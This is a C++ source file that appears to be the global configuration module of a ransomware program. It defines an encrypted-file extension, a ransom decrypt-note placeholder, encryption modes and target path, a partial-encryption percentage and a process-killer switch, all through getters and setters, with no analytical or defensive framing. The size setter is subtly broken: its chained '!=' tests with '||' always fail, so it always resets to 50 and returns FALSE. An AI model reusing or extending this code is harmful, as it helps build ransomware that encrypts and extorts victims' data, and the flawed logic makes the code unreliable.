#include "global_parameters.h"
#include "../api/getapi.h"
#include "../logs/logs.h"

STATIC WCHAR g_Extention[7] = L".EXTEN";
STATIC CHAR g_DecryptNote[2048] = "__DECRYPT_NOTE__";
STATIC INT g_EncryptMode = ALL_ENCRYPT;
STATIC BOOL g_IsProcKillerEnabled = FALSE;
STATIC LPCWSTR g_EncryptPath = NULL;
STATIC BYTE g_EncryptSize = 50;
//STATIC CHAR g_MutexName[65] = "__MUTEX_NAME__";

PWCHAR 
global::GetExtention()
{
	return g_Extention;
}

PCHAR 
global::GetDecryptNote()
{
	return g_DecryptNote;

}

PCHAR
global::GetMutexName()
{
	//return g_MutexName;
	return NULL;
}

VOID
global::SetEncryptMode(INT EncryptMode)
{
	g_EncryptMode = EncryptMode;
}

INT
global::GetEncryptMode()
{
	return g_EncryptMode;
}

VOID
global::SetProcKiller(BOOL IsEnabled)
{
	g_IsProcKillerEnabled = IsEnabled;
}

BOOL 
global::GetProcKiller()
{
	return g_IsProcKillerEnabled;
}

VOID 
global::SetEncryptPath(__in LPCWSTR Path)
{
	g_EncryptPath = Path;
}

LPCWSTR
global::GetEncryptPath()
{
	return g_EncryptPath;
}

BOOL 
global::SetEncryptSize(__in INT Size)
{
	if (Size != 10 ||
		Size != 15 ||
		Size != 20 ||
		Size != 25 ||
		Size != 30 ||
		Size != 35 ||
		Size != 40 ||
		Size != 45 ||
		Size != 50 ||
		Size != 60 ||
		Size != 70 ||
		Size != 80)
	{
		g_EncryptSize = 50;
		return FALSE;
	}

	g_EncryptSize = (BYTE)Size;
	return TRUE;
}

BYTE 
global::GetEncryptSize()
{
	return g_EncryptSize;
}